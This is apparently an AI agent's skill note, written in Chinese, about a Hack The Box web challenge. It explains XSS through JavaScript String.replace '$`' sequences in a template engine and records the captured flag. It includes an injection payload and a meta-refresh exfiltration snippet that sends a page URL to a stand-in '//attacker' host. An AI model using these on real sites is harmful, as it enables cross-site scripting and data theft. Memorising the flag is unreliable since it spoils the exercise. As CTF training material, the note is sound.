---
name: 'string-replace-dollar-sequence-xss'
description: 'String.replace 的 $`/$'''' 特殊序列注入模板引擎 XSS（Nomad Notes 钥匙）+ Codex 卡死教练介入教训'
disable-model-invocation: true
metadata: { domain: web, tier: T3 }
---
> 📌 DSH 适配：本技能移植自 RS。原 read_skill/run_skill 调用 = 用 DSH 的 skill 工具按名加载对应技能；fleet/kali-mcp = 用 bash 后台任务与 subagent 工具实现。

# String.replace `$` replacement 序列 → 模板引擎 XSS（Nomad Notes 教训）

**Why:** Nomad Notes（HTB Medium Web，2026-07-31）的钥匙是 JS `String.replace(str, replacement)` 的 replacement string 特殊序列：`` $` ``（匹配前文本）、`$'`（匹配后文本）、`$&`（匹配串）。模板引擎 `line.replace('{{ key }}', user_value)` 且 escape 不转义 backtick 时，用户输入 `` $`;code()// `` 会把模板自身前缀（含真实引号）复制进 JS 字符串 → 引号闭合 → 任意代码注入。Codex（deepseek-v4-pro）独立跑了 2h45m 卡死在这（反复证明 `"`→`&quot;` 转义 airtight 但没追问"引号还能从哪来"），教练搜 trick 后 5 分钟验证突破。

**How to apply:**
- 🔴 **审计任何 `String.replace(placeholder, user_input)` 模板引擎时，第一件事测试 `$` 序列**：`` $` ``/`$'`/`$&`/`$$`。escape 五字符集（`& < > " '`）之外的一切都可能是武器（backtick、`$`、换行、反斜杠）
- 🔴 **XSS 转义分析不要停在"引号被转义"**——追问：模板/语言特性里还有什么能引入引号？（$ 序列展开、实体双重解码、字符串拼接、行继续符）
- 同题验证过的死路（避免重蹈）：CSP `script-src 'nonce-X'` + 页面无 nonce → 无直接 JS；meta refresh javascript:/data: 被 Chrome/CSP 拦；跨域 fetch 过不了 `new URL(origin).origin === APP_ORIGIN`；HTML form 无法设自定义 header；direct POST 的 remoteAddress 非 loopback
- 关联 trick：无 JS 外带 = `<meta name="referrer" content="unsafe-url">` + `<meta http-equiv="refresh" content="0;url=//attacker">` → Referer 携带完整 URL（flag）——已并入 admin-bot-phishing-pattern 类
- 教练教训：做题者连续 ≥3 轮重读同一文件/重复排除已排除路径 = 陷入循环信号 → 教练立即注入方向提示或让其切换搜索维度（Codex 搜 "CSP bypass" 无果后没有转向 "JS replace 特殊行为"）

已更新 htb-train-loop v7 部署段 + 本记忆。Flag: HTB{WH3N_N0NC3S_W4ND3R_TH3_R3F_W1LL_SCR34M}（#216 已提交）
